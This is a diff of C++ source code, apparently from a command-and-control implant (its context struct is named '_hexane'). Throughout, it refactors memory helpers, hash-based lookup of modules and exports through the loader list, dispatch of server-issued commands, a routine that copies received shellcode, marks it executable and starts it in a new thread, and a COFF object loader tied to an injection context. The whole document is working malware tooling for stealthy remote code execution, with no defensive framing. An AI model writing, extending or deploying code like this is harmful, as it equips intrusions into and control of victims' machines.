@@ -1,4 +1,4 @@
-#include <include/memory.hpp>
+#include <core/include/memory.hpp>
 
 using namespace Utils;
 using namespace Parser;
@@ -22,7 +22,7 @@ namespace Memory {
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
 
             HRSRC res_info      = { };
-            _resource *object   = (_resource*) x_malloc(sizeof(_resource));
+            _resource *object   = (_resource*) Malloc(sizeof(_resource));
 
             x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
             x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
@@ -35,7 +35,7 @@ namespace Memory {
 
         _executable* CreateImageData(uint8_t *data) {
 
-            _executable *image = (_executable*) x_malloc(sizeof(_executable));
+            _executable *image = (_executable*) Malloc(sizeof(_executable));
 
             image->buffer   = data;
             image->dos_head = (PIMAGE_DOS_HEADER) image->buffer;
@@ -62,7 +62,7 @@ namespace Memory {
             instance.base.address           = U_PTR(InstStart());
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
-            if (!(instance.modules.ntdll = M_PTR(NTDLL))) {
+            if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
                 return false;
             }
 
@@ -76,9 +76,11 @@ namespace Memory {
                 return false;
             }
 
-            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
-            x_memset(&instance, 0, sizeof(_hexane));
-            x_memset(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
+            MemCopy(C_DREF(region), &instance, sizeof(_hexane));
+            MemSet(&instance, 0, sizeof(_hexane));
+            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
+
+            return true;
         }
 
         VOID ContextDestroy() {
@@ -87,7 +89,7 @@ namespace Memory {
             auto free = Ctx->nt.RtlFreeHeap;
             auto heap = Ctx->heap;
 
-            x_memset(Ctx, 0, sizeof(_hexane));
+            MemSet(Ctx, 0, sizeof(_hexane));
 
             if (free) {
                 free(heap, 0, Ctx);
@@ -96,10 +98,6 @@ namespace Memory {
     }
 
     namespace Modules {
-
-        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
-            return (HMODULE) data->DllBase;
-        }
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
 
@@ -111,7 +109,7 @@ namespace Memory {
 
                 wchar_t buffer[MAX_PATH] = { };
 
-                if (hash - HashStringW(x_wcs_tolower(buffer, name.Buffer), x_wcslen(name.Buffer)) == 0) {
+                if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
                     return mod;
                 }
             }
@@ -135,7 +133,7 @@ namespace Memory {
 
                 char buffer[MAX_PATH] = { };
 
-                if (hash - HashStringA(x_mbs_tolower(buffer, name), x_strlen(name)) == 0) {
+                if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
                     address = (FARPROC) (base + ((uint32_t*)(base + exports->AddressOfFunctions))[index]);
                     break;
                 }
@@ -151,8 +149,8 @@ namespace Memory {
 
             char buffer[MAX_PATH] = { };
 
-            const auto mod_hash = HashStringA(x_mbs_tolower(buffer, module_name), x_strlen(module_name));
-            const auto fn_hash  = HashStringA(x_mbs_tolower(buffer, export_name), x_strlen(export_name));
+            const auto mod_hash = HashStringA(MbsToLower(buffer, module_name), MbsLength(module_name));
+            const auto fn_hash  = HashStringA(MbsToLower(buffer, export_name), MbsLength(export_name));
 
             while (!symbol) {
                 F_PTR_HASHES(symbol, mod_hash, fn_hash);
@@ -174,28 +172,27 @@ namespace Memory {
 
         BOOL ExecuteCommand(_parser& parser) {
 
-            _command cmd        = { };
-            uintptr_t command   = { };
+            uintptr_t pointer = 0;
 
-            const auto cmd_id = UnpackDword(&parser);
+            const auto cmd_id = UnpackUint32(&parser);
             if (cmd_id == NOJOB) {
                 return true;
             }
 
-            if (!(command = GetCommandAddress(cmd_id))) {
+            if (!(pointer = GetCommandAddress(cmd_id))) {
                 // LOG ERROR
                 return false;
             }
 
-            cmd = (_command) RVA(PBYTE, Ctx->base.address, command);
+            const auto cmd = (COMMAND) RVA(PBYTE, Ctx->base.address, pointer);
             cmd(&parser);
 
             return true;
         }
 
         BOOL ExecuteShellcode(const _parser& parser) {
-            void (*exec)()  = { };
-            void* address   = { };
+
+            void* address = { };
 
             bool success = true;
             size_t size = parser.Length;
@@ -206,17 +203,17 @@ namespace Memory {
                 goto defer;
             }
 
-            x_memcpy(address, parser.buffer, parser.Length);
+            MemCopy(address, parser.buffer, parser.Length);
             if (!NT_SUCCESS(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
                 // LOG ERROR
                 success = false;
                 goto defer;
             }
 
-            exec = (void(*)()) address;
-            exec();
+            const auto exec = (void(*)()) address;
+            Ctx->win32.CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) exec, nullptr, 0, nullptr);
 
-            x_memset(address, 0, size);
+            MemSet(address, 0, size);
 
         defer:
             if (address) {
@@ -227,13 +224,13 @@ namespace Memory {
 
         VOID LoadObject(_parser parser) {
 
-            _injection_ctx inject = { };
-            _coff_params* params = (_coff_params*) x_malloc(sizeof(_coff_params));
+            _inject_context inject = { };
+            _coff_params* params = (_coff_params*) Malloc(sizeof(_coff_params));
 
-            params->entrypoint  = UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
-            params->data        = UnpackBytes(&parser, (uint32_t*)&params->data_size);
-            params->args        = UnpackBytes(&parser, (uint32_t*)&params->args_size);
-            params->cache       = UnpackBool(&parser);
+            params->entrypoint  = UnpackString(&parser, (uint32_t*) &params->entrypoint_length);
+            params->data        = UnpackBytes(&parser, (uint32_t*) &params->data_size);
+            params->args        = UnpackBytes(&parser, (uint32_t*) &params->args_size);
+            params->b_cache     = UnpackBool(&parser);
             params->task_id     = Ctx->session.current_taskid;
 
             inject.parameter = params;
